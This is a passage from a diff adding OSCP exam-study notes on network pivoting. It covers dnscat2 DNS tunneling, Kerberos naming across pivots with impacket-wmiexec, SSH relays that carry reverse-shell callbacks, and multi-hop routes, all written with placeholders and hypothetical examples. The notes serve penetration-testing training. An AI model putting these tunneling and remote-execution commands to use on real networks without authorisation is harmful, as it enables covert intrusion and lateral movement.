+<li>command execution sufficient to run a compatible client;</li>
+<li>either authoritative control/NS delegation for <code>TUNNEL_DOMAIN</code> or direct UDP/53 reachability to the server;</li>
+<li>a resolver chain that forwards the chosen domain externally;</li>
+<li>permission to bind/listen on the required DNS port;</li>
+<li>tolerance for low throughput and conspicuous DNS patterns.</li>
+</ul>
+<p>Authoritative-domain mode:</p>
+<pre><code class="language-bash">dnscat2-server --secret=SHARED_SECRET TUNNEL_DOMAIN
+</code></pre>
+<p>Client:</p>
+<pre><code class="language-bash">./dnscat --secret=SHARED_SECRET TUNNEL_DOMAIN
+</code></pre>
+<p>Direct DNS-server mode shown by the server's own usage output:</p>
+<pre><code class="language-bash">./dnscat --dns server=DNS_SERVER,port=53 --secret=SHARED_SECRET
+</code></pre>
+<p>Server console:</p>
+<pre><code class="language-text">windows
+window -i SESSION_ID
+help
+</code></pre>
+<blockquote>
+<p>A DNS query reaching the server proves only the resolver path. Match the pre-shared secret or independently verify the negotiated authentication string. Cache, recursion, EDNS, TCP fallback, DNS security controls and response-size limits can affect the channel. DNS tunneling is not DNS spoofing; spoofing remains prohibited by the current exam guide.</p>
+</blockquote>
+<h3 id="7-worked-example--hypothetical-12">7. Worked example — hypothetical</h3>
+<p>Observation: a restricted host can resolve an intentionally controlled delegated zone. Test: validate delegation and the documented carrier handshake. Illustrative output: the session establishes but latency is high. Interpretation: use only a justified supported operation or prefer another available route.</p>
+<h3 id="8-verify-the-result-12">8. Verify the result</h3>
+<p>Verify the actual carrier and intended forwarded action; retain delegation and connectivity prerequisites.</p>
+<h3 id="9-failure-and-fallback-12">9. Failure and fallback</h3>
+<p>No delegation, resolver interference, egress policy or missing runtime can block the route. Keep this a conditional fallback.</p>
+<h3 id="10-next-transitions-12">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/pivoting/#fixed-forward">Relay a single TCP service through a fixed forward</a>; <a href="/oscp/notes/methods/pivoting/#pivot-state">Discover pivot interfaces, routes and internal service context</a>; <a href="/oscp/notes/methods/integration/#attack-state">Maintain state and select the next evidence-producing test</a>.</p>
+<p><a id="pivot-dns"></a></p>
+<h2 id="preserve-dns-kerberos-names-and-time-across-a-pivot">Preserve DNS, Kerberos names and time across a pivot</h2>
+<p><strong>Blocks:</strong> 13; study fundamentals before 10–12. <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/#11-dns-and-kerberos-across-pivots">Operational procedure</a> | <a href="/oscp/cheatsheets/pivoting/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-13">1. Purpose and result</h3>
+<p>A route-compatible name and authentication context.</p>
+<h3 id="2-recognition-clues-13">2. Recognition clues</h3>
+<p>An IP connection works while hostname/Kerberos access fails.</p>
+<h4 id="find-the-clue-from-your-starting-access-13">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Compare name resolution, ticket server principals, clock and the KDC path when an IP service works but named authentication fails.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">getent hosts TARGET_HOST
+klist
+date -u
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">TARGET_HOST resolves to WRONG_ADDRESS
+Ticket server: cifs/TARGET_HOST@REALM
+Direct IP transport: works
+</code></pre>
+<p><strong>Recognize this detail:</strong> The route and credential may be valid while name/SPN context is wrong.</p>
+<p><strong>Still missing before method selection:</strong> Check intended DNS source/result, realm/service name, time and KDC/service routes separately.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>Correct naming/time and routes produce accepted service authentication: use that identity-preserving path.</td></tr><tr><td>Ruled out in this context</td><td>The ticket names another service/host: reject it for this operation.</td></tr><tr><td>Inconclusive</td><td>Successful IP transport without named service evidence does not settle Kerberos.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/pivoting/#pivot-state">Discover pivot interfaces, routes and internal service context</a>.</p>
+<h3 id="3-prerequisites-13">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A pivot identity/process or reachable SSH service and a drawn source-to-destination path. <strong>Required conditions:</strong> Reachable correct resolver/KDC path, matching target SPN/hostname, realm configuration and acceptable time.</p>
+<h3 id="4-discover-and-verify-prerequisites-13">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">getent hosts TARGET_HOST
+klist
+date -u
+</code></pre>
+<h3 id="5-why-it-works-13">5. Why it works</h3>
+<p>Connection address and Kerberos service identity can be separated by supported client options. Local DNS or an IP substituted for an SPN can break a valid route/credential combination.</p>
+<h3 id="6-execute-and-choose-variants-13">6. Execute and choose variants</h3>
+<ul>
+<li>Decide whether the application resolves the name locally, ProxyChains intercepts it, the SOCKS exit resolves it, or the pivot's configured resolver handles it.</li>
+<li>Use numeric addresses for route validation; then restore the confirmed hostname when the application protocol requires it.</li>
+<li>Kerberos needs an SPN-compatible hostname, realm/KDC route and correct time. A working IP connection does not prove Kerberos naming works.</li>
+<li>A temporary host mapping is acceptable only for a confirmed in-scope address/name pair and must be recorded.</li>
+</ul>
+<pre><code class="language-bash">getent hosts INTERNAL_FQDN
+curl --socks5-hostname 127.0.0.1:1080 http://INTERNAL_FQDN:PORT/
+klist
+KRB5_TRACE=/dev/stderr kvno cifs/TARGET_HOST
+</code></pre>
+<p>The first command checks Kali's normal resolver. The <code>curl</code> form deliberately delegates the destination hostname through SOCKS. Do not assume a generic resolver utility will be intercepted by ProxyChains: NSS implementation and process behavior vary.</p>
+<p>For Impacket, preserve the target hostname while routing to an IP when the tool supports it:</p>
+<pre><code class="language-bash">impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP \
+  'DOMAIN/USER@TARGET_HOST'
+</code></pre>
+<h3 id="7-worked-example--hypothetical-13">7. Worked example — hypothetical</h3>
+<p>Observation: SMB by IP connects but Kerberos by hostname fails. Test: inspect resolver result, SPN naming and KDC route. Illustrative output: the hostname resolves outside the intended route. Interpretation: correct name resolution while preserving the service identity.</p>
+<h3 id="8-verify-the-result-13">8. Verify the result</h3>
+<p>Verify resolved destination, ticket/server principal and actual authenticated application action.</p>
+<h3 id="9-failure-and-fallback-13">9. Failure and fallback</h3>
+<p>Do not downgrade the identity claim because transport works. DNS, time, KDC access and service authorization are independent checks.</p>
+<h3 id="10-next-transitions-13">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/ad-identities/#kerberos-tickets">Inventory, convert and import tickets in the correct logon context</a>; <a href="/oscp/notes/methods/lateral-movement/#move-auth-material">Select password, NT hash, key-to-ticket or ticket authentication</a>; <a href="/oscp/notes/methods/ad-mapping/#domain-state">Establish domain identity, DC, DNS, time and route</a>; <a href="/oscp/notes/methods/pivoting/#pivot-dns-tunnel">Conditional: tunnel through controlled DNS infrastructure</a>.</p>
+<p><a id="pivot-callback"></a></p>
+<h2 id="build-the-callback-and-delivery-routes-separately-from-the-attack-route">Build the callback and delivery routes separately from the attack route</h2>
+<p><strong>Blocks:</strong> 13; study fundamentals before 10–12. <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/#12-callback-and-delivery-routing">Operational procedure</a> | <a href="/oscp/cheatsheets/pivoting/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-14">1. Purpose and result</h3>
+<p>A verified return or file-delivery path for the selected execution chain.</p>
+<h3 id="2-recognition-clues-14">2. Recognition clues</h3>
+<p>A pivoted exploit reaches its target but its shell/download cannot return.</p>
+<h4 id="find-the-clue-from-your-starting-access-14">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> After the attack path works, draw a new path for target-initiated callbacks/downloads and inspect the listener actually advertised to that target.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">ss -lnt
+ip route get TARGET
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Tool -> proxy -> target: works
+Advertised LHOST: assessment-only interface
+Target -> advertised LHOST: no established route
+</code></pre>
+<p><strong>Recognize this detail:</strong> A working initiating proxy path does not route a target's new connection back to that private interface.</p>
+<p><strong>Still missing before method selection:</strong> Check the target's route, listener bind, chosen reverse forward/agent listener and final handler.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The target-initiated leg reaches the intended receiver and effect is verified: use the return route.</td></tr><tr><td>Ruled out in this context</td><td>The target cannot reach the advertised address and no selected forward provides it: reject that callback address/design.</td></tr><tr><td>Inconclusive</td><td>No packets without execution proof leaves trigger and route separately unresolved.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/execution/#execution-callback">Diagnose connection direction, listener and session failures in order</a>.</p>
+<h3 id="3-prerequisites-14">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A pivot identity/process or reachable SSH service and a drawn source-to-destination path. <strong>Required conditions:</strong> Target-to-listener/download-server path, correct advertised address and compatible reverse listener/forward.</p>
+<h3 id="4-discover-and-verify-prerequisites-14">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">ss -lnt
+ip route get TARGET
+</code></pre>
+<h3 id="5-why-it-works-14">5. Why it works</h3>
+<p>Tool-to-target traffic and target-initiated callbacks can require opposite forwards. A working SOCKS request does not automatically route a target's reverse shell to Kali.</p>
+<h3 id="6-execute-and-choose-variants-14">6. Execute and choose variants</h3>
+<p>A forward path and callback path are different graphs:</p>
+<pre><code class="language-text">Kali -> tunnel -> internal service       # access path
+internal target -> pivot -> Kali listener # callback path
+</code></pre>
+<p>Options:</p>
+<ol>
+<li>make the callback directly to an address the internal host already reaches;</li>
+<li>expose a listener on the pivot and relay it to Kali;</li>
+<li>use a Ligolo agent listener or SSH/Chisel remote forward;</li>
+<li>choose a non-callback technique such as authenticated remote execution.</li>
+</ol>
+<p>Fixed SSH callback relay, run from the pivot:</p>
+<pre><code class="language-bash">ssh -N -g -L 0.0.0.0:PIVOT_PORT:127.0.0.1:KALI_PORT \
+  KALI_USER@LHOST -o ExitOnForwardFailure=yes
+</code></pre>
+<p>This creates the listener on the SSH client/pivot and makes the destination connection from Kali's SSH server to Kali loopback. <code>-g</code> permits other hosts to use the pivot-side local forward. Verify the actual bind with <code>ss</code>; do not infer it from command syntax.</p>
+<p>Also route payload delivery separately. An internal host may reach the pivot but not Kali's HTTP server; relay the delivery service or serve from the pivot when justified.</p>
+<h3 id="7-worked-example--hypothetical-14">7. Worked example — hypothetical</h3>
+<p>Observation: a target is exploitable through SOCKS but no callback arrives. Test: draw the target's actual route to LHOST and expose the documented pivot listener. Illustrative output: traffic reaches the forwarded listener. Interpretation: now verify payload/handler compatibility.</p>
+<h3 id="8-verify-the-result-14">8. Verify the result</h3>
+<p>Verify the target-initiated connection from its source context and the final session or downloaded bytes.</p>
+<h3 id="9-failure-and-fallback-14">9. Failure and fallback</h3>
+<p>Wrong advertised interface, loopback bind or missing reverse forward breaks the return leg while leaving the initial attack functional.</p>
+<h3 id="10-next-transitions-14">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/execution/#execution-callback">Diagnose connection direction, listener and session failures in order</a>; <a href="/oscp/notes/methods/sessions-transfers/#session-reverse">Connect a Linux reverse shell through an available interpreter</a>; <a href="/oscp/notes/methods/sessions-transfers/#transfer-http">Transfer over HTTP using Linux or Windows clients</a>.</p>
+<p><a id="pivot-multihop"></a></p>
+<h2 id="compose-multiple-pivots-and-validate-every-connection-leg">Compose multiple pivots and validate every connection leg</h2>
+<p><strong>Blocks:</strong> 13; study fundamentals before 10–12. <a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/#13-multi-hop-routes">Operational procedure</a> | <a href="/oscp/cheatsheets/pivoting/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-15">1. Purpose and result</h3>
+<p>A verified selected route across multiple source positions.</p>
+<h3 id="2-recognition-clues-15">2. Recognition clues</h3>
+<p>A second internal network is reachable only from a later foothold.</p>
+<h4 id="find-the-clue-from-your-starting-access-15">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Start from the last verified first-hop state, inspect the next foothold's routes and assign each new listener/carrier a source and destination.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-bash">hostname
+ip route
+ss -lnt
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">Hop 1 service test: works
+Hop 2 carrier: connected
+Final application: times out
+</code></pre>
+<p><strong>Recognize this detail:</strong> The break lies beyond a known working leg; a connected second carrier is not a complete final route.</p>
+<p><strong>Still missing before method selection:</strong> Test each listener-to-destination leg, names and return traffic independently from the correct source.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>Every required application leg is verified: use the composed route.</td></tr><tr><td>Ruled out in this context</td><td>One required hop cannot reach the destination under the selected topology: reject that composition.</td></tr><tr><td>Inconclusive</td><td>A final timeout without per-leg tests cannot identify which hop failed.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/pivoting/#pivot-state">Discover pivot interfaces, routes and internal service context</a>.</p>
+<h3 id="3-prerequisites-15">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A pivot identity/process or reachable SSH service and a drawn source-to-destination path. <strong>Required conditions:</strong> A working first route, explicit second carrier/listener directions and correct per-hop DNS/return paths.</p>
+<h3 id="4-discover-and-verify-prerequisites-15">4. Discover and verify prerequisites</h3>
+<pre><code class="language-bash">ip route
+ss -lnt
+</code></pre>
+<h3 id="5-why-it-works-15">5. Why it works</h3>
+<p>Each additional hop introduces another initiator/listener/destination path. A connected second agent does not prove that the final application or callback crosses every leg.</p>
+<h3 id="6-execute-and-choose-variants-15">6. Execute and choose variants</h3>
+<p>For every additional hop, write another complete segment:</p>
+<pre><code class="language-text">Kali -> tunnel A -> PIVOT_A -> tunnel B -> PIVOT_B -> INTERNAL_HOST:PORT
+</code></pre>
+<p>Rules:</p>
+<ul>
+<li>validate one hop before adding the next;</li>
+<li>avoid overlapping local/VPN/internal routes;</li>
+<li>use unique listener and SOCKS ports;</li>
+<li>record which session owns each route;</li>
+<li>ensure the deeper agent/client can reach the upstream listener;</li>
+<li>re-evaluate DNS and callback direction at every hop;</li>
+<li>prefer a routed method for several deep services instead of stacking many opaque wrappers.</li>
+</ul>
+<p>An upstream tunnel failure invalidates every deeper observation. Do not troubleshoot target credentials until the complete path is restored.</p>
+<h3 id="7-worked-example--hypothetical-15">7. Worked example — hypothetical</h3>
+<p>Observation: the first pivot reaches the second host but not its internal subnet. Test: verify the second host's route, then the selected service on each leg. Illustrative output: one forward points to the wrong loopback. Interpretation: fix that leg and retain the working first hop.</p>
+<h3 id="8-verify-the-result-15">8. Verify the result</h3>
+<p>Validate each hop with an application-aware test before chaining the final client.</p>
+<h3 id="9-failure-and-fallback-15">9. Failure and fallback</h3>
+<p>Avoid rebuilding every tunnel after one failure. Isolate the first broken leg and preserve working state.</p>
+<h3 id="10-next-transitions-15">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/pivoting/#pivot-state">Discover pivot interfaces, routes and internal service context</a>; <a href="/oscp/notes/methods/pivoting/#pivot-callback">Build the callback and delivery routes separately from the attack route</a>; <a href="/oscp/notes/methods/lateral-movement/#move-preflight">Match route, destination service and effective authorization</a>.</p>
+<h2 id="sources-and-shared-concepts">Sources and shared concepts</h2>
+<p>Supplied PEN-200 Ch 19–20 pp583–652. <a href="https://man.openbsd.org/ssh">OpenSSH</a>, <a href="https://github.com/jpillora/chisel">Chisel</a>, <a href="https://docs.ligolo.ng/">Ligolo-ng</a>, <a href="https://sshuttle.readthedocs.io/">sshuttle</a>.</p>
+<p>Commands and their adjacent variant conditions are synchronized extracts of the linked operational procedures. Those procedures own complete execution details; this guide owns method selection, explanations and worked reasoning. Tool availability on the learner's Kali or a target must be checked in that environment.</p></article><hr><p><a href="#document">Top of document</a> · <a href="/oscp/">Reference home</a></p></main></body></html>
